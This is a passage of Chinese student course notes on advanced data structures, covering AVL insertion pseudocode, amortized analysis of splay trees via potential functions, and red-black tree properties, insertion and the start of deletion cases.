</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#note-ads-wk1-__codelineno-0-40"></a><span class="w">        </span><span class="n">Set</span><span class="w"> </span><span class="n">left</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">child</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nb">NULL</span>
</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#note-ads-wk1-__codelineno-0-41"></a><span class="w">        </span><span class="n">Set</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mi">0</span>
</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#note-ads-wk1-__codelineno-0-42"></a><span class="w">        </span><span class="n">Return</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">node</span>
</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#note-ads-wk1-__codelineno-0-43"></a><span class="w">    </span><span class="n">Else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">data</span><span class="o">:</span>
</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#note-ads-wk1-__codelineno-0-44"></a><span class="w">        </span><span class="n">Recursively</span><span class="w"> </span><span class="n">insert</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">left</span><span class="w"> </span><span class="n">subtree</span>
</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#note-ads-wk1-__codelineno-0-45"></a><span class="w">        </span><span class="n">If</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="n">difference</span><span class="w"> </span><span class="n">between</span><span class="w"> </span><span class="n">left</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">subtree</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span>
</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#note-ads-wk1-__codelineno-0-46"></a><span class="w">            </span><span class="n">If</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">left</span><span class="p">.</span><span class="n">data</span><span class="o">:</span>
</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#note-ads-wk1-__codelineno-0-47"></a><span class="w">                </span><span class="n">Perform</span><span class="w"> </span><span class="n">LL_rotation</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#note-ads-wk1-__codelineno-0-48"></a><span class="w">            </span><span class="nl">Else</span><span class="p">:</span>
</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#note-ads-wk1-__codelineno-0-49"></a><span class="w">                </span><span class="n">Perform</span><span class="w"> </span><span class="n">LR_rotation</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#note-ads-wk1-__codelineno-0-50"></a><span class="w">    </span><span class="n">Else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">data</span><span class="o">:</span>
</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#note-ads-wk1-__codelineno-0-51"></a><span class="w">        </span><span class="n">Recursively</span><span class="w"> </span><span class="n">insert</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">subtree</span>
</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#note-ads-wk1-__codelineno-0-52"></a><span class="w">        </span><span class="n">If</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="n">difference</span><span class="w"> </span><span class="n">between</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">left</span><span class="w"> </span><span class="n">subtree</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span>
</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#note-ads-wk1-__codelineno-0-53"></a><span class="w">            </span><span class="n">If</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">right</span><span class="p">.</span><span class="n">data</span><span class="o">:</span>
</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#note-ads-wk1-__codelineno-0-54"></a><span class="w">                </span><span class="n">Perform</span><span class="w"> </span><span class="n">RR_rotation</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#note-ads-wk1-__codelineno-0-55"></a><span class="w">            </span><span class="nl">Else</span><span class="p">:</span>
</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#note-ads-wk1-__codelineno-0-56"></a><span class="w">                </span><span class="n">Perform</span><span class="w"> </span><span class="n">RL_rotation</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#note-ads-wk1-__codelineno-0-57"></a><span class="w">    </span><span class="n">Update</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">max</span><span class="p">(</span><span class="n">height</span><span class="p">(</span><span class="n">root</span><span class="p">.</span><span class="n">left</span><span class="p">),</span><span class="w"> </span><span class="n">height</span><span class="p">(</span><span class="n">root</span><span class="p">.</span><span class="n">right</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span>
</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#note-ads-wk1-__codelineno-0-58"></a><span class="w">    </span><span class="n">Return</span><span class="w"> </span><span class="n">root</span>
</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#note-ads-wk1-__codelineno-0-59"></a>
</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#note-ads-wk1-__codelineno-0-60"></a><span class="n">Main</span><span class="w"> </span><span class="n">function</span><span class="o">:</span>
</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#note-ads-wk1-__codelineno-0-61"></a><span class="w">    </span><span class="n">Read</span><span class="w"> </span><span class="n">integer</span><span class="w"> </span><span class="n">N</span><span class="w"> </span><span class="p">(</span><span class="n">number</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">nodes</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">inserted</span><span class="p">)</span>
</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#note-ads-wk1-__codelineno-0-62"></a><span class="w">    </span><span class="n">Initialize</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="nb">NULL</span>
</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#note-ads-wk1-__codelineno-0-63"></a><span class="w">    </span><span class="n">For</span><span class="w"> </span><span class="n">each</span><span class="w"> </span><span class="n">node</span><span class="o">:</span>
</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#note-ads-wk1-__codelineno-0-64"></a><span class="w">        </span><span class="n">Read</span><span class="w"> </span><span class="n">integer</span><span class="w"> </span><span class="n">x</span>
</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#note-ads-wk1-__codelineno-0-65"></a><span class="w">        </span><span class="n">Insert</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">AVL</span><span class="w"> </span><span class="n">tree</span><span class="w"> </span><span class="p">(</span><span class="n">root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">insert</span><span class="p">(</span><span class="n">root</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="p">))</span>
</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#note-ads-wk1-__codelineno-0-66"></a><span class="w">    </span><span class="n">Output</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">node</span>
</span></code></pre></div>
</details>
<h2 id="note-ads-wk1-amortized-analysis">Amortized Analysis(摊还分析)<a class="headerlink" href="#note-ads-wk1-amortized-analysis" title="Permanent link">&para;</a></h2>
<details class="quote">
<summary>吴一航学长的ADS讲义</summary>
<p>摊还分析的想法来源于我们希望估计一种数据结构经过一系列操作的平均花费时间。然而，平均时间
非常难计算，因为每一步都有非常多的选择，连续 m 个操作，可能的操作路径是指数级别的。并且有
时候平均涉及概率分布等，但我们并不知道确切的分布，因此比较难以计算。
一种最简单的估计方法就是用最差情况分析作为平均情况的上界，例如 Splay 树，每个操作最差都是
<span class="arithmatex">\(O(n)\)</span>（n 为树中结点个数）的，因此平均不会比最差情况差，所以也是 <span class="arithmatex">\(O(n)\)</span> 的。然而这样的估计显然
是放得太宽了，我们对这个复杂度是非常不满意的，因此我们需要进行摊还分析。事实上，在最差情况
的分析中，我们忽略了一件事情，就是有的序列是不可能出现的，例如直接在空的树上用 <span class="arithmatex">\(O(n)\)</span> 时间删
除，摊还分析则是希望排除掉最差情况分析中把所有不管可能不可能的情况，最差的路径挑出来的这
种无脑行为，转而分析所有可能的从空结构开始的操作路径中，最差的平均时间，那么这一时间一定比
最差情况分析好，因为排除掉了一些不可能出现的所谓最差序列，但又会大于等于平均时间，因为取的
是所有可能序列中最差的那一种。因此当我们算出摊还分析的时间复杂度，那么它也一定是平均时间
的上界，同时这个上界会比最差情况分析好.</p>
</details>
<p>总的来说，我们希望分析 Average 的情况是比较困难的，分析 worst 的情况是比较粗糙的，所以我们使用摊还分析，通过"劫富济贫"(截长补短),将最坏的情况削弱，同时又是平均情况的上界，只要这种情况是满足条件的，我们就可以用它来证明。</p>
<div class="admonition definition">
<p class="admonition-title">准备工作</p>
<div class="arithmatex">\[\hat{c}_i=c_i+\Delta_i\]</div>
<p>其中 <span class="arithmatex">\(\hat{c}_i\)</span> 是第i次操作的摊还代价，<span class="arithmatex">\(c_i\)</span> 是第i次操作的实际代价，<span class="arithmatex">\(\Delta_i\)</span> 是第i次操作的是截的长（负值），或者补的短（正值）</p>
<p>我们还需要满足：</p>
<div class="arithmatex">\[\sum_{i=1}^{n}\Delta_i \geqslant 0\]</div>
<p>所以：</p>
<div class="arithmatex">\[\sum_{i=1}^{n}\hat{c}_i \geqslant \sum_{i=1}^{n}c_i\]</div>
<p>但是在面对Splay tree的操作，我们并不能每一次都很好的定义一种 <span class="arithmatex">\(\Delta_i\)</span>,所以我们需要用到势能函数，来构造首尾可以相消的项</p>
<div class="arithmatex">\[\Delta_i=\Phi(D_n)-\Phi(D_{n-1})\]</div>
<p>这样，所有的成本</p>
<div class="arithmatex">\[\sum_{i=1}^{n}\hat{c}_i = \sum_{i=1}^{n}c_i+\Phi(D_n)-\Phi(D_{0})\]</div>
</div>
<div class="admonition proof">
<p class="admonition-title">证明Splay tree每个操作的复杂度</p>
<p>我们定义势能函数 <span class="arithmatex">\(\Phi(T)\)</span> 为</p>
<div class="arithmatex">\[\Phi(T)=\sum_{x\in T}Rank(x)\]</div>
<p>其中 <span class="arithmatex">\(Rank(x)=\log S(x)\)</span></p>
<p>即以<span class="arithmatex">\(x\)</span>为根的子树的结点数的对数，包括<span class="arithmatex">\(x\)</span>本身</p>
<p>对于Zig操作,有一次旋转，real cost = 1
<div align=center><img src="../NOTE/ADS/part1/1.png" width=55%/></div></p>
<p>在放缩的过程中，我们保留<span class="arithmatex">\(X\)</span>
$$
\hat{c}_i = 1 + R_2(X) - R_1(X) \
+ R_2(P) - R_1(P) \
\leqslant 1 + R_2(X) - R_1(X)
$$
这是很自然的，因为<span class="arithmatex">\(R_2(P) - R_1(P) \leqslant 0\)</span></p>
<p>对于Zig-zag操作，有两次旋转，real cost = 2</p>
<p><div align=center><img src="../NOTE/ADS/part1/2.png" width=55%/></div></p>
<div class="arithmatex">\[
\hat{c}_i = 2 + R_2(X) - R_1(X) \\
+ R_2(P) - R_1(P) \\
+ R_2(G) - R_1(G) \\
\leqslant 2 (R_2(X) - R_1(X))
\]</div>
<p>在这里，<span class="arithmatex">\(R_2(X)=R_1(G),R_1(P)&gt;R_1(X)\)</span>
所以，只需要考虑<span class="arithmatex">\(R_2(P) + R_2(G)+2\)</span>为什么小于等于<span class="arithmatex">\(2R_2(X)\)</span>,对于旋转后的树，我们有</p>
<div class="arithmatex">\[
\begin{align*}
S(P) + S(G) + 1 &amp;= S(X) \\ 
\log S(P) + \log S(G) + 2 &amp;= \log 4S(P)S(G) \leqslant \log(S(P)+S(G))^2 \\
&amp;= 2\log (S(X)-1) \leqslant 2R_2(X)
\end{align*}
\]</div>
<p>对于Zig-zig操作，有两次旋转，real cost = 2</p>
<p><div align=center><img src="../NOTE/ADS/part1/3.png" width=55%/></div></p>
<div class="arithmatex">\[
\hat{c}_i = 2 + R_2(X) - R_1(X) \\
+ R_2(P) - R_1(P) \\
+ R_2(G) - R_1(G) \\
\leqslant 3 (R_2(X) - R_1(X))
\]</div>
<p>这种情况就稍难一点，首先我们仍然把<span class="arithmatex">\(R_2(X)=R_1(G)\)</span>,然后加上再减去<span class="arithmatex">\(R_1(X)\)</span>,此时式子变成</p>
<div class="arithmatex">\[
\hat{c}_i = 2 + R_1(X) - R_1(X) \\
+ R_2(P) - R_1(P) \\
+ R_2(G) - R_1(X) \\
\leqslant 3 (R_2(X) - R_1(X))
\]</div>
<p>再有<span class="arithmatex">\(R_1(P) &gt; R_1(X),R_2(P)&lt;R_2(X)\)</span>
那么就剩下<span class="arithmatex">\(R_1(X) + R_2(G) + 2 \leqslant 2R_2(X)\)</span> 
类似的，我们有</p>
<div class="arithmatex">\[
\begin{align*}
S_1(X) + S_2(G) + 1 &amp;= S_2(X) \\
\log S_1(X) + \log S_2(G) + 2 &amp;= \log 4S_1(X)S_2(G) \leqslant \log(S_1(X)+S_2(G))^2 \\
&amp;= 2\log (S_2(X)-1) \leqslant 2R_2(X)
\end{align*}
\]</div>
<p>其实，这也是有迹可循的，主要想法就是用不等式的时候，左边两棵树没有互相包含的关系</p>
<p>总的来说，每次操作的 amortized cost  最多不超过 <span class="arithmatex">\(3 (R_2(X) - R_1(X))+1=O(\log N)\)</span></p>
<p>M次操作的总代价为 <span class="arithmatex">\(O(M\log N)\)</span></p>
<p>还没完，我们仍然需要证明，当初始势能不为0时，我们的摊还代价是正确的，其实即使不为0，我们可以确定其初始势能是有界的一个数</p>
<div class="arithmatex">\[
 \sum_{i=1}^{n}\hat{c}_i = \sum_{i=1}^{n}c_i+\Phi(D_n)-\Phi(D_{0})
\]</div>
<p>则平均摊还代价为</p>
<div class="arithmatex">\[
  \frac{\sum_{i=1}^{n}\hat{c}_i}{n} = \frac{\sum_{i=1}^{n}c_i}{n}+\frac{\Phi(D_n)}{n}-\frac{\Phi(D_{0})}{n}
\]</div>
<p>当n趋近于无穷大时，尾项自然就去掉了，所以我们的摊还代价仍然大于等于实际代价，是合理的</p>
</div></section><section class="print-page" id="note-ads-wk2" heading-number="2.2.3.3"><h1 id="note-ads-wk2-b">红黑树与B+树<a class="headerlink" href="#note-ads-wk2-b" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3903 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 11 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 8 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 14 分钟</p>
</div>
<blockquote>
<p>我讨厌黑叔叔</p>
</blockquote>
<p>红黑树不想像AVl树一样通过定义平衡因子，每次操作之后检查是否平衡，通过旋转来保持平衡，而是放松这一简单粗暴的想法，通过给结点染色，从而定义另一种平衡</p>
<div class="admonition definition">
<p class="admonition-title">红黑树的定义</p>
<p>一棵红黑树是满足以下性质的二叉搜索树</p>
<ol>
<li>每个结点要么是红色，要么是黑色</li>
<li>根结点是黑色</li>
<li>每个叶结点（NIL结点，空结点）是黑色</li>
<li>如果一个结点是红色，那么它的两个子结点都是黑色</li>
<li>对于每个结点，从该结点到其所有后代叶结点的简单路径上，均包含相同数目的黑色结点</li>
</ol>
<p>需要注意的是，对于一个没有左子结点的结点，我们认为其子结点是NIL结点，是黑色的</p>
<ul>
<li>我们称 NIL 为外部结点，其余有键值的结点为内部结点。</li>
<li>从某个结点 X 出发到达一个叶子结点（NIL）的任意一条简单路径上的黑色结点个数（不含 X 本身）称为 X 的黑高，记为 bh(X)。根据定义第五条，这一定义是合理的，因为从 X 出发到达一个叶子结点的任意一条简单路径上的黑色结点个数相同。除此之外，我们定义整棵红黑树的黑高为其根结点的黑高。 </li>
</ul>
</div>
<p>一棵有 <span class="arithmatex">\(n\)</span> 个内部结点的红黑树的高度至多为 <span class="arithmatex">\(2 \log (n + 1)\)</span>。</p>
<div class="admonition quote">
<p class="admonition-title">吴一航学长的ADS讲义</p>
<p>如果我们舍去全部的红色结点，剩下的树的结点个数一定大于等于高度为 <span class="arithmatex">\(bh(root)\)</span> 的完全平衡二叉树的结点个数，因为删掉红色结点后可能不是二叉，这就是证明的第一个步骤：证明以 <span class="arithmatex">\(X\)</span> 为root结点的子树至少有 <span class="arithmatex">\(2^{bh(x)} − 1\)</span> 个内部结点。而根据第四条，任何路径上黑色结点必定占到至少一半的数量，因为红色不能是父子关系，所以有了证明的第二步，树高最多为黑高 <span class="arithmatex">\(2\)</span> 倍。</p>
</div>
<p>具体证明第一步，我们可以使用数学归纳法,对树的高度<span class="arithmatex">\(h(x)\)</span>进行归纳</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<div class="arithmatex">\[
For \enspace any \enspace node \enspace x, sizeof(x) \geqslant 2^{bh(x)} – 1.\\
Prove \enspace by \enspace induction.\\
If \enspace h(x) = 0, x \enspace is \enspace NULL\\
sizeof(x) = 2^0 – 1 = 0\\
Suppose \enspace it \enspace is \enspace true \enspace for \enspace all \enspace x \enspace with \enspace h(x) \leqslant k.\\
For \enspace x \enspace  with \enspace h(x) = k + 1, \\
bh(child) = bh(x) \enspace or \enspace bh(x) – 1 \\
Since \enspace h(child) &lt; k,\\
 sizeof(child) \geqslant 2^{bh(child)} – 1 \geqslant 2^{bh(x)-1}– 1 \\
 Hence \enspace sizeof(x) = 1 + 2sizeof(child) \geqslant 2^{bh(x)} – 1
\]</div>
</div>
<p>这样就得到了黑高的bound，再用第二步就得到了整个树高的上界了</p>
<details class="question">
<summary>Question</summary>
<p>证明：在一棵红黑树中，从某结点 X 到其后代叶结点的所有简单路径中，最长的一条路径的长度至多是最短一条的 2 倍</p>
<p>最短路是全黑路，最长路是黑红相间的，而所有简单路径黑色结点个数一样，故而可以证明</p>
</details>
<p><strong>对于搜索操作，红黑树的时间复杂度是 <span class="arithmatex">\(O(\log n)\)</span> 的</strong>,对于插入和删除，其情况就会更加复杂一些</p>
<h2 id="note-ads-wk2-_1">红黑树的插入<a class="headerlink" href="#note-ads-wk2-_1" title="Permanent link">&para;</a></h2>
<p>向红黑树中插入结点时,有可能会破坏树的平衡性质,插入时需要将该结点初始颜色设置为红色，因为如果是黑色，那么其性质5一定会被破坏，接下来我们讨论每一种可能的情况</p>
<h3 id="note-ads-wk2-_2">插入在黑结点下面<a class="headerlink" href="#note-ads-wk2-_2" title="Permanent link">&para;</a></h3>
<p>最简单的情况，没有破坏任何性质，不需要做任何调整</p>
<h3 id="note-ads-wk2-_3">插入空树中<a class="headerlink" href="#note-ads-wk2-_3" title="Permanent link">&para;</a></h3>
<p>破坏了性质2，但是处理方法也很简单，直接将其染色成黑色即可</p>
<h3 id="note-ads-wk2-_4">插入到红色结点的子节点中<a class="headerlink" href="#note-ads-wk2-_4" title="Permanent link">&para;</a></h3>
<p>此时唯一被违反的就是定义第四条，为了恢复，我们的想法是，在不影响性质5(以及其它性质)的前提下，通过一系列的染色和旋转使得没有父子都是红色,主要分为以下3种情况</p>
<h4 id="note-ads-wk2-x">X 有红叔叔<a class="headerlink" href="#note-ads-wk2-x" title="Permanent link">&para;</a></h4>
<p>X 的叔叔（即父亲的兄弟）是红色的，X 无论左右孩子都是该情况</p>
<div class="admonition note">
<p class="admonition-title">wyy有话说</p>
<p>这里所有结点都带子树，一方面至少有 NIL 结点，另一方面这可以不仅仅表示刚刚插入的情况，也可以表示经过几次调整后还在被这种情况困扰，因此更具一般性。注意 G 一定是黑色，因为 P 是红色，插入前它们就在红黑树中，因此不可能违背定义第四条</p>
</div>
<div align=center><img src ="../part1/4.png" width=60%/></div>

<p>我们的想法是将X的红色甩掉，此时它的父亲和叔叔都是红色了，自然只能求助于祖父，但是我们不能直接交换它们的颜色(如果祖父是红色而叔叔父亲是红色，也不满足条件)，所以我们的方案将X的祖父染红，将X的父亲和叔叔染成黑色,(可以理解为将祖父的黑色分配给父亲和叔叔)此时不影响黑高的性质，但是并不代表问题已经解决了，因为曾祖父仍然可能是红色，但是至少问题网上推进了。如果一直推给根节点，根节点染黑即可，否则就是接下来的两种情况 </p>
<h4 id="note-ads-wk2-x_1">X的叔叔是黑色的<a class="headerlink" href="#note-ads-wk2-x_1" title="Permanent link">&para;</a></h4>
<ul>
<li>情况2：X 的叔叔（即父亲的兄弟）是黑色的，且 X 是右孩子</li>
<li>情况3：X 的叔叔（即父亲的兄弟）是黑色的，且 X 是左孩子</li>
</ul>
<div align=center><img src="../NOTE/ADS/part1/5.png" width=60%/></div>

<p>情况2和情况3之间是存在互相转换的(由图可知)，解决方案与AVL tree也是一致的，通过判断红色是LR还是LL来进行旋转，旋转完之后，重新染色，第一层是黑，第二层是红即可</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>在以上的分析中，我们只考虑了X插入在左子树的情况，对于右子树的情况，实际上是完全对称的，对于情况一，仍然求助于祖父，对于情况二和情况三，则考虑RL和RR的情况,最后的染色也是一样的</p>
</div>
<div class="admonition quote">
<p class="admonition-title">吴一航学长的ADS讲义</p>
<p><div align=center><img src="../NOTE/ADS/part1/6.png" width=60%/></div>
如果插入后直接落入情况三，只需要一次旋转染色即可解决，直接落入情况二，一次旋转进入情况三，再一次旋转染色即可解决，但如果落入情况一，一次调整后可能还在情况一，可能直到最后都是通过情况一加上染黑根结点解决，也可能几次调整后进入情况二或三后解决。根据这一流程我们知道，<strong>红黑树插入最多可能的旋转次数为 2</strong>（因为只有情况 2 和 3 会要旋转进入情况 2 后 1 次旋转必定进入情况 3，进入情况 3 后 1 次旋转必定解决），然后 <strong>更改颜色最多是 <span class="arithmatex">\(O(\log n)\)</span></strong> 次，因为进入情况 2 或 3 只需要一次染色，在情况 1 最差也是每两层染一次色，而我们已经证明红黑树的最大高度是<span class="arithmatex">\(O(\log n)\)</span>的。
因此插入操作包括<span class="arithmatex">\(O(\log n)\)</span>的搜索时间，加常数的旋转，加<span class="arithmatex">\(O(\log n)\)</span>的染色，因此还是<span class="arithmatex">\(O(\log n)\)</span>的时
间复杂度</p>
</div>
<p><strong>一棵有 n 个内部结点的红黑树插入一个结点的时间复杂度为 <span class="arithmatex">\(O(\log n)\)</span>。</strong></p>
<details class="question">
<summary>Question</summary>
<p>考虑从空树开始连续插入 <span class="arithmatex">\(n(n &gt; 1)\)</span> 个结点得到一棵红黑树（每一步插入都要保证红黑树性质），试问这棵树一定会有红色结点吗？若是，请给出清晰的证明；若不是，请举出反例。</p>
<p>一定会，可以使用数学归纳法证明：n = 2 时显然正确，根下面插入的结点一定是红色且无需调整；此后如果不需要调整，因为我们插入的是红色结点，因此红色结点只可能变多；如果需要调整，则根据三种情况的讨论，我们发现无论哪一种情况，在调整之后一定还保留着红色结点。有同学可能会质疑，情况 1 如果 G 到了根结点，则需要被染黑，但要注意的是，此时的 X 还是红色的，因此不管什么情况都是会保留红色结点</p>
</details>
<h2 id="note-ads-wk2-_5">红黑树的删除<a class="headerlink" href="#note-ads-wk2-_5" title="Permanent link">&para;</a></h2>
<p>我们首先回忆普通二叉树的删除操作，主要有以下三种情况</p>
<ul>
<li>如果X是叶子结点，直接删除即可</li>
<li>如果X只有一个孩子，直接用孩子替换X即可</li>
<li>如果X有两个孩子，找到X的后继Y，将Y的值赋给X，然后删除Y，这个Y一般而言是左子树的最大结点，或者是右子树的最小结点</li>
</ul>
<p>第三种情况可以通过一步交换变成第一第二种情况中的一种，因为左子树的最大节点不可能有右结点，右子树的最小结点不可能有左结点</p>
<h3 id="note-ads-wk2-_6">叶子结点的删除<a class="headerlink" href="#note-ads-wk2-_6" title="Permanent link">&para;</a></h3>
<p>对于第一种情况,如果X没有子节点,亦即X是叶子结点,那么我们可以直接删除X,并让NiL结点接替这个位置,相当于什么都没有干</p>
<h3 id="note-ads-wk2-_7">内部叶子结点<a class="headerlink" href="#note-ads-wk2-_7" title="Permanent link">&para;</a></h3>
<p>所以对于红黑树的删除,缩减到了两种大情况</p>
<ul>
<li>Case 1:X是有两个NiL结点的内部结点</li>
<li>Case 2:X只有一个NiL结点的内部结点<ul>
<li>Case 2-1:child是红色</li>
<li>Case 2-2:child是黑色</li>
</ul>
</li>
</ul>
<p>如果X只有一个带有键值的子节点,此时如果X是红色,那么万事大吉,直接删除,让它的子节点接替它的位置,如果X是黑色,接替上来的结点是红色,直接染黑即可,如果接替的是NiL结点(Case 1),或者接替上来的是黑色结点(Case 2-2),我们该怎么办</p>
<p>解决方法十分聪明,直接给黑色结点(包括NiL结点)再加上一重黑色,变成 <strong>双黑结点</strong> .此时第五条性质没有被破坏,但是我们凭空多了一种颜色,这自然是不行的,所以我们的想法是,将这一重黑色传递给上层的一个红色结点,或者没找到,直接往上推到根节点,让根结点变成双黑,而根节点从双黑变成黑色是完全没有影响的,这样就解决了问题</p>
<p>我们可以把双黑传递的情况分为以下四类,用子树代表更一般的情况(可能发生在传递的过程中,X代表双黑结点)</p>
<blockquote>
<p>红色呢,救一下啊</p>
</blockquote>
<ul>
<li>情况1: X有红色的兄弟</li>
</ul>
<div align=center><img src="../NOTE/ADS/part1/7.png" width=60%/></div>

<p>此时父结点一定是黑色,我们的想法很简单，兄弟是红色，那就希望兄弟能两肋插刀，把兄弟转上去，为了保持红黑树性质，很可惜只能把父亲染红，自己还承受双黑 debuff。但是好处在于，这个问题转化为了接下来的情况234中的一种,此时X的兄弟一定是黑色,因为这个兄弟之前是X红色兄弟的孩子:</p>
<ul>
<li>情况2:X 的兄弟是黑色的，且兄弟的两个孩子都是黑色的</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
